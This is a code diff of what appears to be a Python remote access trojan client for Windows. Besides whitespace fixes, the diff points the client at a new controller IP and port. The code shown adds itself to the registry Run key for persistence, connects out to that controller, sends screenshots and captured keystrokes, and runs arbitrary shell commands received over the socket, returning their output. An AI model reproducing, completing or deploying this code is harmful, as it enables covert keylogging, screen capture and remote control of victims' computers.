@@ -12,10 +12,10 @@ import psutil
 import ctypes
 import subprocess
 import shutil
-import winreg as reg  
+import winreg as reg
 
-IP = '127.0.0.1'
-PORT = 8888
+IP = '192.168.0.1'
+PORT = 9999
 
 current_pressed = []
 
@@ -35,7 +35,7 @@ def send(send_data):
     client_socket.sendall(data)
 
 def recv():
-    data = client_socket.recv(4)	
+    data = client_socket.recv(4)
     length = int.from_bytes(data, "little")
     buf = recvall(length)
     recv_data = pickle.loads(buf)
@@ -50,7 +50,7 @@ if __name__ == '__main__':
     key_value = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
     open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
     client = reg.SetValueEx(open, "client", 0, reg.REG_SZ, '"C:\Windows\System32\client.exe"')
-    reg.CloseKey(open) 
+    reg.CloseKey(open)
     while True:
         try:
             client_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -83,11 +83,11 @@ if __name__ == '__main__':
                     image = pyautogui.screenshot()
                     send(image)
                     print('[*] Secv Data screen_capture')
-                
+
                 if command == 'keylog_listening':
                     send(current_pressed)
                     print('[*] Secv Data keylog_listening')
-                
+
                 if command == 'keylog_save':
                     send(current_pressed)
                     current_pressed.clear()
@@ -102,12 +102,12 @@ if __name__ == '__main__':
                     ctypes.windll.user32.SystemParametersInfoW(20, 0, "C:\Windows\System32\\1750670.jpg" , 3)
                     send('success!')
                     print('[*] Secv Data change_wallpaper')
-                
+
                 if command[0] == 'command':
                     proc = subprocess.Popen(command[1], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                     stdout_value = proc.stdout.read() + proc.stderr.read()
                     send(stdout_value.decode('utf-8', 'ignore'))
-                    
+
                 if command == 'connected?':
                     send('success!')
                     print('[*] Secv Data success!')
